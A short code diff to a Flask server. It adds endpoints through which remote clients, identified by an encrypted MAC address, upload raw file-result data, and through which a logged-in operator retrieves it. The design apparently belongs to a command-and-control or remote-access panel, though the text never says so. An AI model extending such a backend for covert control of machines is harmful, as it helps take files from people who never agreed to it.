@@ -563,7 +563,14 @@ def file_result():
     output = decrypt_data(request.form.get('output', ''))
     if mac in clients_db:
         clients_db[mac]['file_result'] = output
-        save_db()
+    return "OK", 200
+
+@bp.route('/file_result_raw', methods=['POST'])
+def file_result_raw():
+    mac = decrypt_data(request.headers.get('X-Mac', ''))
+    output = request.get_data(cache=False).decode('utf-8', errors='replace')
+    if mac in clients_db:
+        clients_db[mac]['file_result'] = output
     return "OK", 200
 
 @bp.route('/api/file/result/<mac>')
@@ -576,5 +583,16 @@ def api_file_result(mac):
             return jsonify({"status": "ready", "data": res})
         return jsonify({"status": "waiting"})
     return jsonify({"status": "error"})
+
+@bp.route('/api/file/result_raw/<mac>')
+def api_file_result_raw(mac):
+    if not session.get('logged_in'): return Response("Forbidden", status=403)
+    if mac in clients_db:
+        res = clients_db[mac].get('file_result')
+        if res is not None:
+            clients_db[mac]['file_result'] = None
+            return Response(res, mimetype='text/plain; charset=utf-8')
+        return Response("", status=204)
+    return Response("Not found", status=404)
 
 from werkzeug.utils import secure_filename
